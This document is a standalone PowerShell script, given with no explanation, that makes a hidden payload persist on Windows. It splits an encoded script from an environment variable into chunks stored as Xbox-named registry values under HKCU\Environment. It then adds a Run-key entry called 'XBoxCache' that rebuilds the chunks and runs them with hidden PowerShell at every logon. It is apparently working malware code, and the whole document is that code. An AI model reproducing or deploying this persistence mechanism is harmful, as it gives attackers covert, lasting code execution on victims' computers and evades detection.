do {
    $psScript = $env:xps1;
    $regValueName = "XBoxD";
    $regValueAutoRunName = "XBoxCache";

    function f0($fargs) {
        $content = $fargs[0];
        $chunkSize = $fargs[1];
        $chunkList = [System.Collections.Generic.List[string]]::new();
        $tmpStr = '';
        $contentChars = $content.ToCharArray();
        for ($i = 0;$i -lt $contentChars.Length;$i++) {
            $tmpStr += $contentChars[$i];
            if ($tmpStr.Length -eq $chunkSize) {
                $chunkList.Add($tmpStr);
                $tmpStr = '';
            }
        }if ($tmpStr.Length -ne 0) {
            $chunkList.Add($tmpStr);
        }return $chunkList.ToArray();
    }
	
    function f1($fargs) {
        $regKey = $fargs[0]
        $regName = $fargs[1]
        try {
            $regProps = Get-ItemProperty -Path $regKey
        } catch {
            Write-Host "Error accessing registry key: $_"
            return $false
        }
        if ($regProps.PSObject.Properties.Name -contains $regName) {
            return $true
        }
        return $false
    }
	
	function f2() {
        $regEnvPath = "HKCU:\Environment";
        $regAutoRunPath = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
        $regItemNamePrefix = $regValueName;
        $regItemNameAutoRun = $regValueAutoRunName;
        $psRunCmd = "powershell -windowStyle hidden";
        $chunkSize = 2039;
        [string[]]$chunks = f0($psScript, $chunkSize);
        
        for ($i = 1;$i -lt 2048;$i++) {
            $valName = ($regItemNamePrefix + $i.ToString());
            $isExistRecord = f1($regEnvPath, $valName);
            if ($isExistRecord) {
                try {
                    .Remove-ItemProperty-Name($regItemNamePrefix + $i.ToString())-Path $regEnvPath;
                }
                catch {
                    break;
                }
            }
            else {
                break;
            }
        }
        
		$autoRunCommand = '';
        for ($i = 0;$i -lt $chunks.Length;$i++) {
            $name = $regItemNamePrefix + ($i + 1).ToString();
            New-ItemProperty -Path $regEnvPath -Name $name -PropertyType 'String' -Value $chunks[$i] -Force
            $autoRunCommand += ('$env:' + $name);
            if ($i -lt $chunks.Length - 1) {
                $autoRunCommand += '+';
            }
            
        }
        
		$autoRunCommand = '(' + $autoRunCommand + ')';
        $temlateRecord = 'cmd /c start /min "" ' + $psRunCmd + ' -c(' + $psRunCmd + ' -enC($env:xxxvxxx))';
        $autoRunRecord = $temlateRecord.Replace('($env:xxxvxxx)', $autoRunCommand);
        New-ItemProperty -Path $regAutoRunPath -Name $regItemNameAutoRun -PropertyType 'String' -Value $autoRunRecord -Force

        return 0;
    }
	
	$r = f2;
    Write-Output('_m03tsfc: ' + $r);
}while ($false);
    